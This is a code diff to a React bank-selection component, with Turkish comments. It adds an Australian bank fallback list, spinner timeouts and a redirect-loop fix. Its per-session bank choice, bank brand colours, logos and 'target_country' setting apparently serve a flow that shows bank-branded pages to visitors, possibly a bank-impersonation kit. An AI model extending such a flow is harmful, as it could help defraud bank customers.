@@ -6,6 +6,7 @@ import { ConfigMissing } from "@/components/demo/ConfigMissing";
 import { optimizeSupabaseImageUrl } from "@/lib/asset-url";
 import { resolveLocalBankLogoFile } from "@/lib/bank-logo-constants";
 import type { BankCatalogEntry } from "@/lib/at-bank-catalog";
+import { AU_BANKS_FALLBACK } from "@/lib/at-bank-catalog";
 import { createBrowserSupabaseClient } from "@/lib/supabase/client";
 import { getPreferredRouteSessionId } from "@/lib/session-id-client";
 import { useSettings } from "@/contexts/SettingsContext";
@@ -49,11 +50,22 @@ export function BankenClientClean({ sessionId, routeSessionId, initialBanks }: P
   const supabase = useMemo(() => createBrowserSupabaseClient(), []);
   const { settings, loading: settingsLoading } = useSettings();
   const effectiveRouteSessionId = getPreferredRouteSessionId(sessionId, routeSessionId);
-  const [banks, setBanks] = useState<BankCatalogEntry[]>(initialBanks);
+  const EFFECTIVE_DEFAULT_BANKS: BankCatalogEntry[] =
+    (initialBanks && initialBanks.length > 0) ? initialBanks :
+    (AU_BANKS_FALLBACK.length > 0 ? AU_BANKS_FALLBACK.map((b) => ({ ...b, country: b.country ?? "Australia", isActive: true })) : []);
+
+  const [banks, setBanks] = useState<BankCatalogEntry[]>(EFFECTIVE_DEFAULT_BANKS);
   const [bankSlug, setBankSlug] = useState("");
-  const [searchTerm, setSearchTerm] = useState("");
+  const [searchTerm, setSearchTerm] = useState(() => {
+    // GERİ tuşu ile geldiyse search kutusunu SIFIRLA (eski filtre kalmaması için)
+    try {
+      const flag = sessionStorage.getItem(RETURN_TO_BANK_LIST_FLAG);
+      if (flag === "1") { sessionStorage.removeItem(RETURN_TO_BANK_LIST_FLAG); return ""; }
+    } catch { /* ignore */ }
+    return "";
+  });
   const [saving, setSaving] = useState(false);
-  const [resettingSelection, setResettingSelection] = useState(true);
+  const [resettingSelection, setResettingSelection] = useState(false);  // ⭐ Başlangıçta false: spinner gösterme (fallback bankalar hazır)
   const [msg, setMsg] = useState<string | null>(null);
   const [recovering, setRecovering] = useState(false);
   const [sessionFormData, setSessionFormData] = useState<Record<string, unknown>>({});
@@ -63,7 +75,12 @@ export function BankenClientClean({ sessionId, routeSessionId, initialBanks }: P
   const mountedRef = useRef(true);
 
   useEffect(() => {
-    setBanks(initialBanks);
+    // ⭐ EĞER initialBanks boş geldiyse bile fallback AU_BANKS_FALLBACK'i koru (ESKİ: undefined gelince setBanks([]) yapıyordu, BOŞTU)
+    if (initialBanks && initialBanks.length > 0) {
+      setBanks(initialBanks);
+    } else if (AU_BANKS_FALLBACK.length > 0) {
+      setBanks(AU_BANKS_FALLBACK.map((b) => ({ ...b, country: b.country ?? "Australia", isActive: true })));
+    }
   }, [initialBanks]);
 
   useEffect(() => {
@@ -137,19 +154,31 @@ export function BankenClientClean({ sessionId, routeSessionId, initialBanks }: P
       const data = await res.json();
       if (!Array.isArray(data.banks)) return;
 
+      // ⭐ Gelen banks boş ise (DB/API'den dönmedi) FALLBACK KORU (setBanks BOŞ YAPMA!)
+      const incomingBanks: any[] = data.banks;
+      if (!incomingBanks || incomingBanks.length === 0) {
+        // Fallback: AU_BANKS_FALLBACK'i göster (hiç boş gösterme)
+        setBanks(AU_BANKS_FALLBACK.map((b) => ({ ...b, country: b.country ?? "Australia", isActive: true })));
+        return;
+      }
+
       setBanks(
-        data.banks.map((bank: any) => ({
+        incomingBanks.map((bank: any) => ({
           slug: bank.slug,
           name: bank.name,
           domain: bank.domain,
           logoFile: bank.logoFile ?? bank.logo_file,
+          brandColor: bank.brandColor ?? bank.brand_color ?? "#0a8f6a",
+          accentColor: bank.accentColor ?? bank.accent_color ?? "#129C4F",
+          logo: bank.logo ?? (bank.name || "BANK").toUpperCase().slice(0, 6),
           country: bank.country,
           isActive: bank.isActive !== false && bank.is_active !== false,
-        })),
+        })) as BankCatalogEntry[],
       );
     } catch (error) {
       if (error instanceof Error && error.name === "AbortError") return;
-      /* ignore transient refresh errors */
+      // ⭐ HATA ALINIRSA FALLBACK KORU (ASLA setBanks([]) YAPMA!)
+      setBanks(AU_BANKS_FALLBACK.map((b) => ({ ...b, country: b.country ?? "Australia", isActive: true })) as BankCatalogEntry[]);
     } finally {
       if (refreshAbortRef.current === controller) {
         refreshAbortRef.current = null;
@@ -179,7 +208,12 @@ export function BankenClientClean({ sessionId, routeSessionId, initialBanks }: P
       setRecovering(false);
       setSearchTerm("");
       setBankSlug("");
-      setBanks(initialBanks);
+      // ⭐ GERİ'de bank listesi BOŞ KALMASIN: initialBanks boşsa fallback AU_FALLBACK
+      setBanks(
+        (initialBanks && initialBanks.length > 0)
+          ? initialBanks
+          : AU_BANKS_FALLBACK.map((b) => ({ ...b, country: b.country ?? "Australia", isActive: true }))
+      );
 
       void (async () => {
         await resetSessionBankSelection();
@@ -208,13 +242,20 @@ export function BankenClientClean({ sessionId, routeSessionId, initialBanks }: P
       setRecovering(false);
       setSearchTerm("");
       setBankSlug("");
-      setBanks(initialBanks);
+      // ⭐ Pageshow GERİ dönüşte de boş KALMASIN: fallback
+      setBanks(
+        (initialBanks && initialBanks.length > 0)
+          ? initialBanks
+          : AU_BANKS_FALLBACK.map((b) => ({ ...b, country: b.country ?? "Australia", isActive: true }))
+      );
     };
 
     const refreshView = () => {
       if (navigationLockRef.current) return;
       resetUi();
       void refreshBanks();
+      // ⭐ Pageshow sonrası resettingSelection takılırsa 750ms sonra FORCE false (spinner sonsuza kadar dönmesin)
+      window.setTimeout(() => { if (mountedRef.current) setResettingSelection(false); }, 750);
     };
 
     const onPageShow = (event: PageTransitionEvent) => {
@@ -234,14 +275,26 @@ export function BankenClientClean({ sessionId, routeSessionId, initialBanks }: P
   }, [initialBanks, refreshBanks]);
 
   const demoOptions = useMemo(() => {
-    // Sadece aktif olanları ve (eğer seçilmişse) hedef ülkenin bankalarını göster
+    // 1) Sadece aktif olanları al
     let validBanks = banks.filter(b => b.isActive !== false);
-    
+
+    // 2) Hedef ülke filtresi UYGULA (eğer varsa)
+    let afterCountry: BankCatalogEntry[] = validBanks;
     if (settings.target_country && settings.target_country !== "All") {
-      validBanks = validBanks.filter(b => countriesMatch(b.country, settings.target_country));
+      afterCountry = validBanks.filter(b => countriesMatch(b.country, settings.target_country));
     }
 
-    return validBanks.map((bank) => ({
+    // ⭐ ⭐ EN KRİTİK KISIM: Eğer ülke filtresinden 0 sonuç döndüyse (country undefined/bozuk gelmiş olabilir)
+    //    FİLTREYİ KALDIR, geçersiz kıl ve TÜM AKTİF BANKALARI göster (ASLA BOŞ LİSTE GÖSTERME!)
+    const finalList: BankCatalogEntry[] = (afterCountry.length === 0 && validBanks.length > 0) ? validBanks : afterCountry;
+
+    // ⭐ SON KALDIRMA: Final list hala 0 ise (refreshBanks failed olabilir) FALLBACK AU_BANKS_FALLBACK göster
+    const safetyFinal: BankCatalogEntry[] =
+      (finalList.length === 0 && AU_BANKS_FALLBACK.length > 0)
+        ? AU_BANKS_FALLBACK.map((b) => ({ ...b, country: b.country ?? "Australia", isActive: true }))
+        : finalList;
+
+    return safetyFinal.map((bank) => ({
       slug: bank.slug,
       displayName: bank.name,
       domain: bank.domain,
@@ -256,12 +309,16 @@ export function BankenClientClean({ sessionId, routeSessionId, initialBanks }: P
   }, [searchTerm, demoOptions]);
 
   useEffect(() => {
+    // ⭐ sessionId yoksa fallback bankaları göster, infinite router.replace LOOP YOK (artık)
+    //    Eski kod: router.replace("/banken") yapıyordu, aynı adrese döndüğü için infinite loop + boş prop ile geliyordu
     if (sessionId) return;
     try {
       const cachedSessionId = localStorage.getItem("activeSessionId");
       if (cachedSessionId) {
         setRecovering(true);
-        router.replace("/banken");
+        // ⭐ KENDI ADRESİNE YÖNLENDİRME YAPMA (döngü) — SADECE state işaretle
+        //     Bankalar zaten AU_BANKS_FALLBACK ile dolu, kullanıcı seçme işlemine devam edebilir
+        setTimeout(() => { if (mountedRef.current) setRecovering(false); }, 300);
       }
     } catch {
       /* ignore localStorage access errors */
@@ -277,8 +334,13 @@ export function BankenClientClean({ sessionId, routeSessionId, initialBanks }: P
       if (cancelled) return;
       setResettingSelection(false);
     })();
+    // ⭐ Reset selection async işlem 1sn'den uzun sürerse FORCE false (spinner takılması KALICI ÖNLENSİN)
+    const forceResetTimer = window.setTimeout(() => {
+      if (!cancelled && mountedRef.current) setResettingSelection(false);
+    }, 1000);
     return () => {
       cancelled = true;
+      window.clearTimeout(forceResetTimer);
     };
   }, [resetSessionBankSelection, sessionId, supabase]);
 
